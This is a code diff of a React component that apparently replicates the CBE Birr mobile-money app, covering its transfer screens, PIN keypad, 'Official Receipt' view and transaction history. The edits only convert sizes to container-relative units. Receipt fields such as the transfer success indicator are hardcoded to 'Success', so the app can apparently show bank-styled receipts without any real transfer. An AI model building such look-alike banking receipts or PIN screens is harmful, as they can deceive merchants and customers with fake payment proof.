+                            <span style={{ fontSize: '2.3cqw' }} className="font-bold italic font-serif">i</span>
                           </div>
                           <div className="flex flex-col min-w-0">
-                            <span className="text-[11.5px] text-[#4b5563] font-medium leading-none">
+                            <span style={{ fontSize: '2.25cqw', fontWeight: 400 }} className="text-[#4b5563] leading-none">
                               Account No.
                             </span>
-                            <span className="text-[13.5px] text-[#1c1b1f] font-semibold mt-1 leading-tight truncate font-mono">
+                            <span style={{ fontSize: '2.75cqw', fontWeight: 500 }} className="text-[#1c1b1f] mt-[0.8cqw] leading-tight truncate font-sans">
                               {transferSource === 'other_wallets'
                                 ? (walletAccountNumber || '0715095670')
                                 : (bankAccountNumber || '01320847291000')}
                             </span>
                           </div>
                         </div>
-                        <Check className="w-4 h-4 text-black stroke-[2.5] shrink-0" />
+                        <Check style={{ width: '3.8cqw', height: '3.8cqw' }} className="text-black shrink-0" strokeWidth={2.5} />
                       </div>
 
                       {/* Card 4: Amount */}
-                      <div className="w-full min-h-[62px] bg-[#F7F2FA] rounded-2xl px-3.5 py-2.5 flex items-center justify-between shadow-xs border border-white/75 shrink-0">
-                        <div className="flex items-center gap-3 min-w-0">
-                          <div className="w-5 h-5 rounded-full bg-black text-white flex items-center justify-center shrink-0">
-                            <span className="text-[11px] font-bold italic font-serif">i</span>
+                      <div className="w-full min-h-[13.5cqw] bg-[#F7F2FA] rounded-[3.6cqw] px-[3.5cqw] py-[2.2cqw] flex items-center justify-between shadow-xs border border-white/75 shrink-0">
+                        <div className="flex items-center gap-[2.8cqw] min-w-0">
+                          <div className="w-[4.8cqw] h-[4.8cqw] rounded-full bg-black text-white flex items-center justify-center shrink-0">
+                            <span style={{ fontSize: '2.3cqw' }} className="font-bold italic font-serif">i</span>
                           </div>
                           <div className="flex flex-col min-w-0">
-                            <span className="text-[11.5px] text-[#4b5563] font-medium leading-none">
+                            <span style={{ fontSize: '2.25cqw', fontWeight: 400 }} className="text-[#4b5563] leading-none">
                               Amount
                             </span>
-                            <span className="text-[13.5px] text-[#1c1b1f] font-semibold mt-1 leading-tight truncate">
+                            <span style={{ fontSize: '2.75cqw', fontWeight: 500 }} className="text-[#1c1b1f] mt-[0.8cqw] leading-tight truncate">
                               {transferSource === 'other_wallets' ? (walletAmount || '1') : (bankAmount || '1')}
                             </span>
                           </div>
                         </div>
-                        <Check className="w-4 h-4 text-black stroke-[2.5] shrink-0" />
+                        <Check style={{ width: '3.8cqw', height: '3.8cqw' }} className="text-black shrink-0" strokeWidth={2.5} />
                       </div>
 
                       {/* Card 5: Reason (if provided) */}
                       {(transferSource === 'other_wallets' ? walletReason : bankReason) ? (
-                        <div className="w-full min-h-[62px] bg-[#F7F2FA] rounded-2xl px-3.5 py-2.5 flex items-center justify-between shadow-xs border border-white/75 shrink-0">
-                          <div className="flex items-center gap-3 min-w-0">
-                            <div className="w-5 h-5 rounded-full bg-black text-white flex items-center justify-center shrink-0">
-                              <span className="text-[11px] font-bold italic font-serif">i</span>
+                        <div className="w-full min-h-[13.5cqw] bg-[#F7F2FA] rounded-[3.6cqw] px-[3.5cqw] py-[2.2cqw] flex items-center justify-between shadow-xs border border-white/75 shrink-0">
+                          <div className="flex items-center gap-[2.8cqw] min-w-0">
+                            <div className="w-[4.8cqw] h-[4.8cqw] rounded-full bg-black text-white flex items-center justify-center shrink-0">
+                              <span style={{ fontSize: '2.3cqw' }} className="font-bold italic font-serif">i</span>
                             </div>
                             <div className="flex flex-col min-w-0">
-                              <span className="text-[11.5px] text-[#4b5563] font-medium leading-none">
+                              <span style={{ fontSize: '2.25cqw', fontWeight: 400 }} className="text-[#4b5563] leading-none">
                                 Reason
                               </span>
-                              <span className="text-[13.5px] text-[#1c1b1f] font-semibold mt-1 leading-tight truncate">
+                              <span style={{ fontSize: '2.75cqw', fontWeight: 500 }} className="text-[#1c1b1f] mt-[0.8cqw] leading-tight truncate">
                                 {transferSource === 'other_wallets' ? walletReason : bankReason}
                               </span>
                             </div>
                           </div>
-                          <Check className="w-4 h-4 text-black stroke-[2.5] shrink-0" />
+                          <Check style={{ width: '3.8cqw', height: '3.8cqw' }} className="text-black shrink-0" strokeWidth={2.5} />
                         </div>
                       ) : null}
                     </div>
 
                     {/* 4. FIXED NUMERIC KEYPAD (Anchored at Bottom ~32.5% of body = ~30.3% of screen) */}
-                    <div className="shrink-0 w-full h-[32.5%] bg-[#D1CFCF] px-3 pb-2.5 pt-2 border-t border-black/5 z-20">
-                      <div className="w-full h-full grid grid-cols-3 grid-rows-4 gap-2 sm:gap-2.5">
+                    <div className="shrink-0 w-full h-[32.5%] bg-[#D1CFCF] px-[2.8cqw] pb-[2.4cqw] pt-[2cqw] border-t border-black/5 z-20">
+                      <div className="w-full h-full grid grid-cols-3 grid-rows-4 gap-[2cqw]">
                         {/* Keys 1-9 */}
                         {['1', '2', '3', '4', '5', '6', '7', '8', '9'].map((digit) => (
                           <button
                             key={digit}
                             type="button"
                             onClick={() => handleTransferKeypadClick(digit)}
-                            className="w-full h-full bg-[#F5F5F5] active:bg-gray-200 text-[#1c1b1f] font-bold text-[19px] sm:text-[20px] rounded-xl shadow-xs flex items-center justify-center active:scale-95 transition-all cursor-pointer"
+                            style={{ fontSize: '3.55cqw' }}
+                            className="w-full h-full bg-[#F5F5F5] active:bg-gray-200 text-[#1c1b1f] font-bold rounded-[2.6cqw] shadow-xs flex items-center justify-center active:scale-95 transition-all cursor-pointer"
                           >
                             {digit}
                           </button>
@@ -6914,10 +8200,10 @@ export default function CBEBirrFullscreenApp() {
                         <button
                           type="button"
                           onClick={handleTransferBackspace}
-                          className="w-full h-full bg-[#F5F5F5] active:bg-gray-200 text-[#1c1b1f] rounded-xl shadow-xs flex items-center justify-center active:scale-95 transition-all cursor-pointer"
+                          className="w-full h-full bg-[#F5F5F5] active:bg-gray-200 text-[#1c1b1f] rounded-[2.6cqw] shadow-xs flex items-center justify-center active:scale-95 transition-all cursor-pointer"
                           aria-label="Backspace"
                         >
-                          <svg className="w-5 h-5 fill-current" viewBox="0 0 24 24">
+                          <svg style={{ width: '4.6cqw', height: '4.6cqw' }} className="fill-current" viewBox="0 0 24 24">
                             <path d="M22 3H7c-.69 0-1.23.35-1.59.88L0 12l5.41 8.11c.36.53.9.89 1.59.89h15c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-3 12.59L17.59 17 14 13.41 10.41 17 9 15.59 12.59 12 9 8.41 10.41 7 14 10.59 17.59 7 19 8.41 15.41 12 19 15.59z"/>
                           </svg>
                         </button>
@@ -6926,7 +8212,8 @@ export default function CBEBirrFullscreenApp() {
                         <button
                           type="button"
                           onClick={() => handleTransferKeypadClick('0')}
-                          className="w-full h-full bg-[#F5F5F5] active:bg-gray-200 text-[#1c1b1f] font-bold text-[19px] sm:text-[20px] rounded-xl shadow-xs flex items-center justify-center active:scale-95 transition-all cursor-pointer"
+                          style={{ fontSize: '3.55cqw' }}
+                          className="w-full h-full bg-[#F5F5F5] active:bg-gray-200 text-[#1c1b1f] font-bold rounded-[2.6cqw] shadow-xs flex items-center justify-center active:scale-95 transition-all cursor-pointer"
                         >
                           0
                         </button>
@@ -6936,7 +8223,8 @@ export default function CBEBirrFullscreenApp() {
                           type="button"
                           onClick={handleProceedToTransferSubmit}
                           disabled={transferPin.length < 4}
-                          className={`w-full h-full rounded-xl flex items-center justify-center font-semibold text-[15px] shadow-xs transition-all ${
+                          style={{ fontSize: '3.0cqw' }}
+                          className={`w-full h-full rounded-[2.6cqw] flex items-center justify-center font-semibold shadow-xs transition-all ${
                             transferPin.length === 4
                               ? 'bg-[#8b278e] text-white active:scale-95 cursor-pointer shadow-md'
                               : 'bg-[#C3B8C7] text-[#86768B] cursor-not-allowed opacity-90'
@@ -7018,15 +8306,24 @@ export default function CBEBirrFullscreenApp() {
                     className="z-20 flex items-center justify-center pointer-events-none select-none"
                   >
                     {!transferPin ? (
-                      <span className="text-[#8e8c8f] font-normal text-[15px] sm:text-[16px] tracking-normal">
+                      <span
+                        style={{ fontSize: '2.65cqw', fontWeight: 400 }}
+                        className="text-[#8e8c8f] tracking-normal"
+                      >
                         PIN
                       </span>
                     ) : showTransferPin ? (
-                      <span className="text-[#1c1b1f] font-bold text-[17px] sm:text-[18px] tracking-[6px]">
+                      <span
+                        style={{ fontSize: '3.25cqw', letterSpacing: '0.8cqw' }}
+                        className="text-[#1c1b1f] font-bold"
+                      >
                         {transferPin}
                       </span>
                     ) : (
-                      <span className="text-[#1c1b1f] font-bold text-[22px] sm:text-[24px] tracking-[6px] pt-1">
+                      <span
+                        style={{ fontSize: '4.0cqw', letterSpacing: '1.1cqw', paddingTop: '0.5cqw' }}
+                        className="text-[#1c1b1f] font-bold"
+                      >
                         {'*'.repeat(transferPin.length)}
                       </span>
                     )}
@@ -7058,8 +8355,9 @@ export default function CBEBirrFullscreenApp() {
                         top: '31.5%',
                         left: '12%',
                         width: '76%',
+                        fontSize: '2.6cqw',
                       }}
-                      className="z-30 text-center text-[12px] font-bold text-white bg-red-600/90 py-1.5 px-3 rounded-full shadow-lg pointer-events-none"
+                      className="z-30 text-center font-bold text-white bg-red-600/90 py-[1.2cqw] px-[2.8cqw] rounded-full shadow-lg pointer-events-none"
                     >
                       {transferPinError}
                     </motion.div>
@@ -7079,10 +8377,16 @@ export default function CBEBirrFullscreenApp() {
                     {transferSource === 'phone_number' ? (
                       phoneReceiverName ? (
                         <>
-                          <span className="text-[#1c1b1f] font-semibold text-[13px] leading-tight">
+                          <span
+                            style={{ fontSize: '2.70cqw', fontWeight: 400 }}
+                            className="text-[#1c1b1f] leading-tight"
+                          >
                             Name
                           </span>
-                          <span className="text-[#1c1b1f] font-bold text-[14.5px] sm:text-[15.5px] leading-tight truncate mt-0.5">
+                          <span
+                            style={{ fontSize: '2.85cqw', fontWeight: 400 }}
+                            className="text-[#1c1b1f] leading-tight truncate mt-[0.5cqw]"
+                          >
                             {phoneReceiverName}
                           </span>
                         </>
@@ -7090,11 +8394,17 @@ export default function CBEBirrFullscreenApp() {
                     ) : (
                       <>
                         {displayReceiverName ? (
-                          <span className="text-[#1c1b1f] font-bold text-[14.5px] sm:text-[15.5px] leading-tight truncate">
+                          <span
+                            style={{ fontSize: '2.85cqw', fontWeight: 400 }}
+                            className="text-[#1c1b1f] leading-tight truncate"
+                          >
                             {displayReceiverName}
                           </span>
                         ) : null}
-                        <span className="text-[#49454f] font-mono text-[11.5px] sm:text-[12.5px] leading-tight mt-1">
+                        <span
+                          style={{ fontSize: '2.00cqw', fontWeight: 400 }}
+                          className="text-[#1c1b1f] font-sans leading-tight mt-[0.8cqw]"
+                        >
                           {receiverAccount || '-'}
                         </span>
                       </>
@@ -7112,10 +8422,16 @@ export default function CBEBirrFullscreenApp() {
                     }}
                     className="z-10 flex flex-col justify-center pointer-events-none select-none"
                   >
-                    <span className="text-[#1c1b1f] font-semibold text-[13px] leading-tight">
+                    <span
+                      style={{ fontSize: '2.70cqw', fontWeight: 400 }}
+                      className="text-[#1c1b1f] leading-tight"
+                    >
                       Amount
                     </span>
-                    <span className="text-[#1c1b1f] font-bold text-[14.5px] sm:text-[15px] leading-tight mt-0.5">
+                    <span
+                      style={{ fontSize: '2.00cqw', fontWeight: 400 }}
+                      className="text-[#1c1b1f] leading-tight mt-[0.5cqw]"
+                    >
                       {transferSource === 'phone_number'
                         ? (phoneSendAmount || '5')
                         : (sendAmount || '5')}
@@ -7283,8 +8599,9 @@ export default function CBEBirrFullscreenApp() {
                         left: '67.9%',
                         width: '29.3%',
                         height: '6.0%',
+                        fontSize: '3.0cqw',
                       }}
-                      className="bg-[#8b278e] rounded-xl flex items-center justify-center text-white font-bold text-sm shadow-md pointer-events-none z-15"
+                      className="bg-[#8b278e] rounded-[2.6cqw] flex items-center justify-center text-white font-bold shadow-md pointer-events-none z-15"
                     >
                       Next
                     </div>
@@ -7348,11 +8665,11 @@ export default function CBEBirrFullscreenApp() {
               >
                 <div
                   style={{
-                    fontSize: '3.25cqw',
-                    lineHeight: 1.38,
-                    paddingLeft: '2.8%',
-                    paddingRight: '2.8%',
-                    paddingTop: '1.4%',
+                    fontSize: '2.95cqw',
+                    lineHeight: 1.42,
+                    paddingLeft: '4.2%',
+                    paddingRight: '4.2%',
+                    paddingTop: '1.2%',
                   }}
                   className="text-[#1a1a1a] font-normal shrink-0"
                 >
@@ -7568,8 +8885,9 @@ export default function CBEBirrFullscreenApp() {
                     bottom: '9.5%',
                     left: '10.0%',
                     width: '80.0%',
+                    fontSize: '2.6cqw',
                   }}
-                  className="z-30 text-center text-xs font-semibold text-white bg-black/80 py-2 px-3 rounded-full shadow-lg backdrop-blur-xs animate-fade-in"
+                  className="z-30 text-center font-semibold text-white bg-black/80 py-2 px-3 rounded-full shadow-lg backdrop-blur-xs animate-fade-in"
                 >
                   {receiptToast}
                 </div>
@@ -7599,10 +8917,10 @@ export default function CBEBirrFullscreenApp() {
                     <ArrowLeft className="w-5 h-5" />
                   </button>
                   <div>
-                    <h2 className="text-[14px] sm:text-[15px] font-bold leading-tight tracking-wide">
+                    <h2 className="text-[3.15cqw] font-bold leading-tight tracking-wide">
                       Official Receipt
                     </h2>
-                    <p className="text-[10px] text-purple-200 leading-tight">
+                    <p className="text-[2.15cqw] text-purple-200 leading-tight">
                       CBEBirr VAT Invoice / Customer Receipt
                     </p>
                   </div>
@@ -7738,7 +9056,7 @@ export default function CBEBirrFullscreenApp() {
                           : (isPhoneTx ? (phoneReason || 'Wallet Transfer') : (sendReason || 'Customer transfer to CBE account')));
 
                       return (
-                        <g fontFamily="Arial, Helvetica, sans-serif" fill="#141414" fontSize="11" fontWeight="normal">
+                        <g fontFamily="Arial, Helvetica, sans-serif" fill="#141414" fontSize="10.5" fontWeight="normal">
                           {/* Customer Name */}
                           <rect x="440" y="105" width="215" height="20" fill="#ffffff" />
                           <text x="442" y="118">
@@ -7861,8 +9179,9 @@ export default function CBEBirrFullscreenApp() {
                     bottom: '12%',
                     left: '10%',
                     width: '80%',
+                    fontSize: '2.6cqw',
                   }}
-                  className="z-50 text-center text-xs font-semibold text-white bg-black/85 py-2 px-3 rounded-full shadow-xl backdrop-blur-xs"
+                  className="z-50 text-center font-semibold text-white bg-black/85 py-2 px-3 rounded-full shadow-xl backdrop-blur-xs"
                 >
                   {receiptToast}
                 </div>
@@ -7891,7 +9210,7 @@ export default function CBEBirrFullscreenApp() {
                   >
                     <ArrowLeft className="w-5 h-5 text-white" />
                   </button>
-                  <h2 className="text-[15px] sm:text-[16px] font-bold text-white tracking-wide">
+                  <h2 className="text-[3.2cqw] font-bold text-white tracking-wide">
                     
                   </h2>
                 </div>
@@ -7900,7 +9219,7 @@ export default function CBEBirrFullscreenApp() {
                   <button
                     type="button"
                     onClick={() => {}}
-                    className="cursor-pointer text-white text-xs font-semibold tracking-wider hover:opacity-80 transition-opacity bg-white/10 px-1.5 py-0.5 rounded"
+                    className="cursor-pointer text-white text-[2.5cqw] font-semibold tracking-wider hover:opacity-80 transition-opacity bg-white/10 px-1.5 py-0.5 rounded"
                     title="Change Language / ቋንቋ ይምረጡ"
                   >
                     
@@ -7919,60 +9238,60 @@ export default function CBEBirrFullscreenApp() {
               >
                 {/* 1. Transaction ID */}
                 <div className="py-2.5">
-                  <p className="text-[12.5px] font-bold text-[#111827]">
+                  <p className="text-[2.75cqw] font-bold text-[#111827]">
                     Transaction ID
                   </p>
-                  <p className="text-[12px] font-semibold text-[#7a1c7d] mt-0.5 font-mono">
+                  <p className="text-[2.65cqw] font-semibold text-[#7a1c7d] mt-0.5 font-mono">
                     {selectedTx?.ref || transactionRef || '-'}
                   </p>
                 </div>
 
                 {/* 2. Transaction Time */}
                 <div className="py-2.5">
-                  <p className="text-[12.5px] font-bold text-[#111827]">
+                  <p className="text-[2.75cqw] font-bold text-[#111827]">
                     Transaction Time
                   </p>
-                  <p className="text-[12px] font-semibold text-[#7a1c7d] mt-0.5 font-mono">
+                  <p className="text-[2.65cqw] font-semibold text-[#7a1c7d] mt-0.5 font-mono">
                     {selectedTx?.date || transactionDate || '-'}
                   </p>
                 </div>
 
                 {/* 3. Transaction Type */}
                 <div className="py-2.5">
-                  <p className="text-[12.5px] font-bold text-[#111827]">
+                  <p className="text-[2.75cqw] font-bold text-[#111827]">
                     Transaction Type
                   </p>
-                  <p className="text-[12px] font-semibold text-[#7a1c7d] mt-0.5">
+                  <p className="text-[2.65cqw] font-semibold text-[#7a1c7d] mt-0.5">
                     {selectedTx?.title || 'Send Money'}
                   </p>
                 </div>
 
                 {/* 4. Transaction Status */}
                 <div className="py-2.5">
-                  <p className="text-[12.5px] font-bold text-[#111827]">
+                  <p className="text-[2.75cqw] font-bold text-[#111827]">
                     Transaction Status
                   </p>
-                  <p className="text-[12px] font-semibold text-[#7a1c7d] mt-0.5">
+                  <p className="text-[2.65cqw] font-semibold text-[#7a1c7d] mt-0.5">
                     {selectedTx?.status || 'Completed'}
                   </p>
                 </div>
 
                 {/* 5. Debit Account Type */}
                 <div className="py-2.5">
-                  <p className="text-[12.5px] font-bold text-[#111827]">
+                  <p className="text-[2.75cqw] font-bold text-[#111827]">
                     Debit Account Type
                   </p>
-                  <p className="text-[12px] font-semibold text-[#7a1c7d] mt-0.5">
+                  <p className="text-[2.65cqw] font-semibold text-[#7a1c7d] mt-0.5">
                     {selectedTx?.debitAccountType || 'Customer E-money Account'}
                   </p>
                 </div>
 
                 {/* 6. Debit Party Mnemonic */}
                 <div className="py-2.5">
-                  <p className="text-[12.5px] font-bold text-[#111827]">
+                  <p className="text-[2.75cqw] font-bold text-[#111827]">
                     Debit Party Mnemonic
                   </p>
-                  <p className="text-[12px] font-semibold text-[#7a1c7d] mt-0.5">
+                  <p className="text-[2.65cqw] font-semibold text-[#7a1c7d] mt-0.5">
                     {(userAccount || phoneNumber)
                       ? `${userAccount || phoneNumber} - ${(userName || 'CBEBIRR CUSTOMER').toUpperCase()}`
                       : (userName || 'CBEBIRR CUSTOMER').toUpperCase()}
@@ -7981,20 +9300,20 @@ export default function CBEBirrFullscreenApp() {
 
                 {/* 7. Credit Account Type */}
                 <div className="py-2.5">
-                  <p className="text-[12.5px] font-bold text-[#111827]">
+                  <p className="text-[2.75cqw] font-bold text-[#111827]">
                     Credit Account Type
                   </p>
-                  <p className="text-[12px] font-semibold text-[#7a1c7d] mt-0.5">
+                  <p className="text-[2.65cqw] font-semibold text-[#7a1c7d] mt-0.5">
                     {selectedTx?.creditAccountType || 'CBE Bank Account'}
                   </p>
                 </div>
 
                 {/* 8. Credit Party Mnemonic */}
                 <div className="py-2.5">
-                  <p className="text-[12.5px] font-bold text-[#111827]">
+                  <p className="text-[2.75cqw] font-bold text-[#111827]">
                     Credit Party Mnemonic
                   </p>
-                  <p className="text-[12px] font-semibold text-[#7a1c7d] mt-0.5 font-mono">
+                  <p className="text-[2.65cqw] font-semibold text-[#7a1c7d] mt-0.5 font-mono">
                     {(() => {
                       const acc = selectedTx?.account || receiverAccount || '-';
                       if (acc.length >= 8) {
@@ -8007,10 +9326,10 @@ export default function CBEBirrFullscreenApp() {
 
                 {/* 9. Amount */}
                 <div className="py-2.5">
-                  <p className="text-[12.5px] font-bold text-[#111827]">
+                  <p className="text-[2.75cqw] font-bold text-[#111827]">
                     Amount
                   </p>
-                  <p className="text-[12px] font-semibold text-[#7a1c7d] mt-0.5 font-mono">
+                  <p className="text-[2.65cqw] font-semibold text-[#7a1c7d] mt-0.5 font-mono">
                     {typeof selectedTx?.amount === 'number'
                       ? selectedTx.amount.toFixed(2)
                       : parseFloat(selectedTx?.amount || sendAmount || '0').toFixed(2)}
@@ -8019,40 +9338,40 @@ export default function CBEBirrFullscreenApp() {
 
                 {/* 10. Currency */}
                 <div className="py-2.5">
-                  <p className="text-[12.5px] font-bold text-[#111827]">
+                  <p className="text-[2.75cqw] font-bold text-[#111827]">
                     Currency
                   </p>
-                  <p className="text-[12px] font-semibold text-[#7a1c7d] mt-0.5">
+                  <p className="text-[2.65cqw] font-semibold text-[#7a1c7d] mt-0.5">
                     ETB
                   </p>
                 </div>
 
                 {/* 11. transfer successIndicator */}
                 <div className="py-2.5">
-                  <p className="text-[12.5px] font-bold text-[#111827]">
+                  <p className="text-[2.75cqw] font-bold text-[#111827]">
                     transfer successIndicator
                   </p>
-                  <p className="text-[12px] font-semibold text-[#7a1c7d] mt-0.5">
+                  <p className="text-[2.65cqw] font-semibold text-[#7a1c7d] mt-0.5">
                     Success
                   </p>
                 </div>
 
                 {/* 12. Receiver Name */}
                 <div className="py-2.5">
-                  <p className="text-[12.5px] font-bold text-[#111827]">
+                  <p className="text-[2.75cqw] font-bold text-[#111827]">
                     Receiver Name
                   </p>
-                  <p className="text-[12px] font-semibold text-[#7a1c7d] mt-0.5">
+                  <p className="text-[2.65cqw] font-semibold text-[#7a1c7d] mt-0.5">
                     {selectedTx?.receiverName || displayReceiverName || '-'}
                   </p>
                 </div>
 
                 {/* 13. Order Id */}
                 <div className="py-2.5">
-                  <p className="text-[12.5px] font-bold text-[#111827]">
+                  <p className="text-[2.75cqw] font-bold text-[#111827]">
                     Order Id
                   </p>
-                  <p className="text-[12px] font-semibold text-[#7a1c7d] mt-0.5 font-mono">
+                  <p className="text-[2.65cqw] font-semibold text-[#7a1c7d] mt-0.5 font-mono">
                     {selectedTx?.orderId || selectedTx?.ref || transactionRef || '-'}
                   </p>
                 </div>
@@ -8119,7 +9438,7 @@ export default function CBEBirrFullscreenApp() {
                 aria-label="Get Receipt"
               >
                 <Receipt className="w-7 h-7 text-white" strokeWidth={2.2} />
-                <span className="text-[11.5px] font-bold text-white tracking-wide">
+                <span className="text-[2.45cqw] font-bold text-white tracking-wide">
                   Get Receipt
                 </span>
               </button>
@@ -8266,42 +9585,42 @@ export default function CBEBirrFullscreenApp() {
                       {/* Left side: Circular arrow icon (Green downward arrow for credit/receive, red upward arrow for debit/send) and info */}
                       <div className="flex items-center space-x-2.5 min-w-0 pr-2">
                         {/* eslint-disable-next-line @next/next/no-img-element */}
-                        <img
-                          src={
-                            tx.type === 'credit' || tx.title.toLowerCase().includes('receive')
-                              ? '/screens/tx_arrow_down_green_icon.png'
-                              : '/screens/tx_arrow_up_icon.png'
-                          }
-                          alt={tx.type === 'credit' || tx.title.toLowerCase().includes('receive') ? 'Receive Money' : 'Transfer'}
-                          className="w-9 h-9 sm:w-10 sm:h-10 object-contain shrink-0 pointer-events-none select-none"
-                          draggable={false}
-                        />
-                        <div className="min-w-0">
-                          {/* Compact text size matching Screenshot_20261029-185406.png */}
-                          <p className="font-bold text-[#1f2937] text-[11px] sm:text-[11.5px] leading-tight truncate">
-                            {tx.title}
-                          </p>
-                          <p className="text-[#9ca3af] text-[9.5px] sm:text-[10px] font-mono mt-0.5">
-                            {tx.date}
-                          </p>
+                          <img
+                            src={
+                              tx.type === 'credit' || tx.title.toLowerCase().includes('receive')
+                                ? '/screens/tx_arrow_down_green_icon.png'
+                                : '/screens/tx_arrow_up_icon.png'
+                            }
+                            alt={tx.type === 'credit' || tx.title.toLowerCase().includes('receive') ? 'Receive Money' : 'Transfer'}
+                            className="w-[8.5cqw] h-[8.5cqw] object-contain shrink-0 pointer-events-none select-none"
+                            draggable={false}
+                          />
+                          <div className="min-w-0">
+                            {/* Compact text size matching Screenshot_20261029-185406.png */}
+                            <p className="font-bold text-[#1f2937] text-[2.65cqw] leading-tight truncate">
+                              {tx.title}
+                            </p>
+                            <p className="text-[#9ca3af] text-[2.25cqw] font-mono mt-0.5">
+                              {tx.date}
+                            </p>
+                          </div>
                         </div>
-                      </div>
 
-                      {/* Right side: Amount and purple Chevron */}
-                      <div className="flex items-center space-x-2 shrink-0">
-                        <span className="font-bold text-[#7a1c7d] text-[13px] sm:text-[13.5px]">
-                          {tx.amount}
-                        </span>
-                        <ChevronRight className="w-4 h-4 text-[#7a1c7d] shrink-0" strokeWidth={2.4} />
-                      </div>
-                    </motion.div>
-                  ))}
+                        {/* Right side: Amount and purple Chevron */}
+                        <div className="flex items-center space-x-2 shrink-0">
+                          <span className="font-bold text-[#7a1c7d] text-[3.1cqw]">
+                            {tx.amount}
+                          </span>
+                          <ChevronRight className="w-4 h-4 text-[#7a1c7d] shrink-0" strokeWidth={2.4} />
+                        </div>
+                      </motion.div>
+                    ))}
 
-                {transactions.length === 0 && (
-                  <div className="w-full py-12 text-center text-gray-500 text-xs font-medium">
-                    ምንም የዝውውር ታሪክ የለም (No transactions found)
-                  </div>
-                )}
+                  {transactions.length === 0 && (
+                    <div className="w-full py-12 text-center text-gray-500 text-[2.6cqw] font-medium">
+                      ምንም የዝውውር ታሪክ የለም (No transactions found)
+                    </div>
+                  )}
 
                 {/* Bottom spacer for clean comfortable scrolling, delete hint removed per request */}
                 <div className="w-full h-8" />
@@ -8611,8 +9930,9 @@ export default function CBEBirrFullscreenApp() {
                     bottom: '12%',
                     left: '10%',
                     width: '80%',
+                    fontSize: '2.6cqw',
                   }}
-                  className="z-50 text-center text-xs font-semibold text-white bg-black/85 py-2 px-3 rounded-full shadow-xl backdrop-blur-xs"
+                  className="z-50 text-center font-semibold text-white bg-black/85 py-2 px-3 rounded-full shadow-xl backdrop-blur-xs"
                 >
                   {receiptToast}
                 </div>
@@ -8801,8 +10121,9 @@ export default function CBEBirrFullscreenApp() {
                     bottom: '12%',
                     left: '10%',
                     width: '80%',
+                    fontSize: '2.6cqw',
                   }}
-                  className="z-50 text-center text-xs font-semibold text-white bg-black/85 py-2 px-3 rounded-full shadow-xl backdrop-blur-xs"
+                  className="z-50 text-center font-semibold text-white bg-black/85 py-2 px-3 rounded-full shadow-xl backdrop-blur-xs"
                 >
                   {receiptToast}
                 </div>
@@ -8989,8 +10310,9 @@ export default function CBEBirrFullscreenApp() {
                     bottom: '12%',
                     left: '10%',
                     width: '80%',
+                    fontSize: '2.6cqw',
                   }}
-                  className="z-50 text-center text-xs font-semibold text-white bg-black/85 py-2 px-3 rounded-full shadow-xl backdrop-blur-xs"
+                  className="z-50 text-center font-semibold text-white bg-black/85 py-2 px-3 rounded-full shadow-xl backdrop-blur-xs"
                 >
                   {receiptToast}
                 </div>
@@ -9131,7 +10453,8 @@ export default function CBEBirrFullscreenApp() {
                     }
                   }}
                   placeholder="Receivers Phone"
-                  className="w-full h-full bg-transparent text-[#262626] text-[15px] sm:text-[16px] font-normal outline-none px-1 placeholder:text-[#7c7784]"
+                  style={{ fontSize: '2.68cqw', fontWeight: 400 }}
+                  className="w-full h-full bg-transparent text-[#262626] outline-none px-1 placeholder:text-[#7c7784]"
                 />
               </div>
 
@@ -9163,8 +10486,10 @@ export default function CBEBirrFullscreenApp() {
                     left: '5.0%',
                     width: '90.0%',
                     height: '2.4%',
+                    fontSize: '2.85cqw',
+                    fontWeight: 500,
                   }}
-                  className="flex items-center justify-center text-center text-[#18181b] text-[14.5px] sm:text-[15px] font-semibold tracking-tight z-20 pointer-events-none select-none animate-in fade-in duration-150"
+                  className="flex items-center justify-center text-center text-[#18181b] tracking-tight z-20 pointer-events-none select-none animate-in fade-in duration-150"
                 >
                   <span>{phoneReceiverName}</span>
                 </div>
@@ -9195,7 +10520,8 @@ export default function CBEBirrFullscreenApp() {
                   onClick={handlePhoneAmountFieldInteraction}
                   onTouchEnd={handlePhoneAmountFieldInteraction}
                   placeholder="Amount"
-                  className={`w-full h-full bg-transparent text-[#262626] text-[15px] sm:text-[16px] font-normal outline-none px-1 placeholder:text-[#7c7784] ${isPhoneTransferring ? 'pointer-events-none opacity-60' : ''}`}
+                  style={{ fontSize: '2.68cqw', fontWeight: 400 }}
+                  className={`w-full h-full bg-transparent text-[#262626] outline-none px-1 placeholder:text-[#7c7784] ${isPhoneTransferring ? 'pointer-events-none opacity-60' : ''}`}
                 />
               </div>
 
@@ -9233,7 +10559,8 @@ export default function CBEBirrFullscreenApp() {
                   value={phoneReason}
                   onChange={(e) => setPhoneReason(e.target.value)}
                   placeholder="Reason"
-                  className="w-full h-full bg-transparent text-[#262626] text-[15px] sm:text-[16px] font-normal outline-none px-1 placeholder:text-[#7c7784]"
+                  style={{ fontSize: '2.68cqw', fontWeight: 400 }}
+                  className="w-full h-full bg-transparent text-[#262626] outline-none px-1 placeholder:text-[#7c7784]"
                 />
               </div>
 
@@ -9245,8 +10572,9 @@ export default function CBEBirrFullscreenApp() {
                     top: '41.2%',
                     left: '9.0%',
                     width: '82.0%',
+                    fontSize: '2.6cqw',
                   }}
-                  className="text-[#d32f2f] text-[12px] font-medium text-center z-20"
+                  className="text-[#d32f2f] font-medium text-center z-20"
                 >
                   {phoneTransferError}
                 </div>
@@ -9330,11 +10658,7 @@ export default function CBEBirrFullscreenApp() {
                     className="fixed inset-0 z-[9999] w-screen h-screen bg-[#7a1c7d] flex items-center justify-center pointer-events-auto select-none"
                   >
                     <div
-                      className="bg-white rounded-2xl shadow-[0_8px_32px_rgba(0,0,0,0.28)] border border-black/[0.05] flex items-center justify-center p-4"
-                      style={{
-                        width: '92px',
-                        height: '92px',
-                      }}
+                      className="bg-white rounded-2xl shadow-[0_8px_32px_rgba(0,0,0,0.28)] border border-black/[0.05] flex items-center justify-center p-4 w-[19cqw] h-[19cqw]"
                     >
                       <div className="relative w-10 h-10 flex items-center justify-center pointer-events-none select-none">
                         <CBEAuthenticSpinner size={40} color="#8b278e" speed={0.95} />
@@ -9352,8 +10676,9 @@ export default function CBEBirrFullscreenApp() {
                     bottom: '12%',
                     left: '10%',
                     width: '80%',
+                    fontSize: '2.6cqw',
                   }}
-                  className="z-50 text-center text-xs font-semibold text-white bg-black/85 py-2 px-3 rounded-full shadow-xl backdrop-blur-xs"
+                  className="z-50 text-center font-semibold text-white bg-black/85 py-2 px-3 rounded-full shadow-xl backdrop-blur-xs"
                 >
                   {receiptToast}
                 </div>
